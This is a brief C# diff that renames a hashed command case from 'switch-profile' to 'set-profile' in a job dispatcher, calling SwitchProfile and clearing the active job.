@@ -170,7 +170,10 @@ namespace Athena.Commands
                     });
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                case "48C8331B1BF8E91B67A05C697C05259F": //switch-profile
+                case "E9B43EE9A9B0FDF6EF393DC0591C11DB": //set-profile
+                    SwitchProfile(job);
+                    this.activeJobs.Remove(task.id, out _);
+                    break;
                     
                     
 #if WINBUILD
